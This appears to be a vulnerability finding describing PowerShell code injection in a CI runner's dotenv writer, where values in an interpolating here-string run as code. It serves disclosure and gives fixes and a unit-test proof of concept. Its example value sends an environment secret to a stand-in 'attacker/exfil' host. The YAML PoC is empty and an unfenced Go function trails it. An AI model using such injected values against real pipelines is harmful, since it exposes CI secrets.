### Title
PowerShell dotenv writer embeds unescaped `$`/backtick sequences in an interpolating here-string, allowing PowerShell code injection - (File: shells/powershell.go)

### Summary
`PsWriter.DotEnvVariables` writes job variable values into the generated PowerShell script using a double-quoted ("interpolating") here-string (`@"..."@`), but the value content is produced by `helpers.DotEnvEscape`, which only escapes backslashes, double quotes, `\n` and `\r`. `DotEnvEscape` was written for the godotenv/bash `.env` format and does not escape PowerShell metacharacters such as `$`, `` ` ``, or subexpression syntax `$(...)`/`${...}`, so attacker-controlled variable values are evaluated as PowerShell code instead of being written literally to the dotenv file.

### Finding Description
`PsWriter.DotEnvVariables` builds the script line as: [1](#0-0) 

`@"..."@` in PowerShell is a **double-quoted here-string**, which — unlike a single-quoted here-string (`@'...'@`) — still performs variable expansion, subexpression expansion (`$( ... )`), and backtick escape processing on its contents before the resulting string is handed to `[System.IO.File]::WriteAllText`.

The content interpolated into that here-string comes from `helpers.DotEnvEscape`: [2](#0-1) 

`escapeDotEnvValue` only escapes `\`, `"`, `\n`, and `\r` — the exact set godotenv needs to correctly round-trip a POSIX-style `.env` value. It does **not** escape `$`, `` ` ``, or the here-string terminator sequence `"@`. Consequently, a variable value such as:

```
FOO=$(Invoke-WebRequest -Uri http://attacker/exfil -Body $env:SOME_SECRET)
```

is written verbatim (only quotes/backslashes/newlines are backslash-escaped) into the here-string. When the generated script is executed by `powershell`/`pwsh`, the here-string is expanded *before* `WriteAllText` is called, meaning the subexpression runs as live PowerShell code in the job's script context rather than being persisted as inert file content.

The escaping of `\n`/`\r` incidentally prevents the classic "close the here-string early with a literal newline + `"@`" trick (since real newlines never reach the here-string body), but it does nothing to stop `$()`/`` ` ``-based code execution, which does not require a literal newline.

This is a genuine interplay bug: `DotEnvEscape` is shared across shells (`bash.go` and `powershell.go` both call it) and is only safe for contexts where the destination string is non-interpolating (e.g., a single-quoted/quoted heredoc in bash). `powershell.go`'s use of an interpolating here-string is incompatible with that escaping contract, and no PowerShell-specific escaping (equivalent to `psQuoteVariable`, which is correctly used in `PsWriter.Variable`) is applied here.

### Impact Explanation
Any variable value that flows through `PsWriter.DotEnvVariables` — this includes CI/CD variables and, notably, values propagated between jobs via `artifacts:reports:dotenv` — can inject arbitrary PowerShell subexpressions that execute during generation/execution of the runner-produced script, rather than being safely written as literal file content. Because the whole job script (variable exports, git credential setup, user script) is emitted into a single PowerShell buffer, an injected subexpression executes with access to whatever is already in scope in that script (e.g. other exported `$env:` variables), which can be used to read and exfiltrate values via out-of-band channels, bypassing the intent that dotenv values are inert data.

### Likelihood Explanation
Reachable by any pipeline author using the `powershell`/`pwsh` shell whose job consumes variables that pass through `DotEnvVariables` (e.g. variables sourced from a prior job's `artifacts:reports:dotenv` file, which is fully attacker-controlled content). No special runner configuration or privilege is required beyond normal pipeline authoring capability, and the trigger is deterministic (any value containing `$(` reaches `WriteAllText` uninterpreted-as-data).

### Recommendation
Do not use an interpolating here-string for `DotEnvVariables` in `shells/powershell.go`. Either:
- Switch to a single-quoted (verbatim) here-string `@'...'@`, escaping only the sequence that could prematurely terminate it (a line consisting solely of `'@`), or
- Base64-encode the dotenv content and decode it in the script (mirroring the technique already used in `generateSaveScript`), or
- Introduce a PowerShell-specific dotenv escaper (escaping `` ` ``, `$`, and here-string terminators) analogous to `psQuoteVariable`, instead of reusing the bash-oriented `helpers.DotEnvEscape`.

### Proof of Concept
Go unit test extending `shells/powershell_test.go`:
```go
func TestPsWriter_DotEnvVariables_Injection(t *testing.T) {
    w := &PsWriter{Shell: SNPwsh, EOL: "\n", TemporaryPath: `C:\tmp`}
    vars := map[string]string{
        "FOO": `$(Write-Output INJECTED)`,
    }
    w.DotEnvVariables("dotenv", vars)
    script := w.String()
    // Assert the raw, unescaped "$(...)" made it into the interpolating here-string
    assert.Contains(t, script, `$(Write-Output INJECTED)`)
    // In a real pwsh execution, this would print "INJECTED" instead of writing
    // the literal string to the dotenv file — proving code execution rather
    // than literal persistence.
}
```
An integration PoC job:
```yaml
stage1:

  artifacts:

      dotenv: build.env

```

func DotEnvEscape(variables map[string]string) string {
	var sb strings.Builder

	// Sort variables to get deterministic output
	keys := make([]string, 0, len(variables))
	for key := range variables {
		keys = append(keys, key)
	}
	sort.Strings(keys)

	for _, key := range keys {
		if !isValidDotEnvKey(key) {
			// Skip invalid keys
			continue
		}

		value := variables[key]
		fmt.Fprintf(&sb, "%s=\"%s\"\n", key, escapeDotEnvValue(value))
	}

	return sb.String()
}
